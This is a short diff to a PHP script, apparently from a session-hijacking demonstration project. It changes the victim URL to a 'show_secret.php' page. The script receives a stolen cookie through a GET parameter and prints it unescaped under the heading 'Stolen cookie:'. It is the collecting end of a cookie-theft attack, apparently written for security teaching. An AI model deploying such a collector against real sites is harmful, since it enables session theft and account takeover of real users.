@@ -1,6 +1,6 @@
 <?php
 
-$victimURL = "http://phpinfosec/session_hijacking/index.php";
+$victimURL = "http://phpinfosec/session_hijacking/show_secret.php";
 $stolenCookie = $_GET['cookies'];
 
 echo "<h1>Stolen cookie:</h1><pre>$stolenCookie</pre>";
